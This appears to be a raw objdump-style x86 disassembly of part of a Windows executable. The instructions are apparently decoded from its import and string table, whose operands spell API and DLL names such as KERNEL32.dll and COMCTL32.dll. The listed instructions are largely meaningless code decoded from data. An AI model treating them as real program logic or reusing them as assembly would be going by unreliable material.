  413141:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  413148:	jns    0x41318b
  41314a:	add    BYTE PTR [eax],al
  41314c:	cmp    BYTE PTR [ebx],al
  41314e:	dec    edi
  41314f:	jo     0x4131b6
  413151:	outs   dx,BYTE PTR ds:[esi]
  413152:	inc    ebp
  413153:	jbe    0x4131ba
  413155:	outs   dx,BYTE PTR ds:[esi]
  413156:	je     0x413199
  413158:	add    BYTE PTR [eax],al
  41315a:	dec    ebp
  41315b:	add    eax,0x7274736c
  413160:	ins    BYTE PTR es:[edi],dx
  413161:	outs   dx,BYTE PTR gs:[esi]
  413163:	inc    ecx
  413164:	add    BYTE PTR [eax],al
  413166:	add    al,BYTE PTR [bx+0x65]
  41316a:	je     0x4131c0
  41316c:	push   0x64616572
  413171:	dec    esp
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	arpl   WORD PTR [ecx+0x6c],sp
  413176:	add    BYTE PTR gs:[ebx+0x4],ch
  41317a:	push   ebp
  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
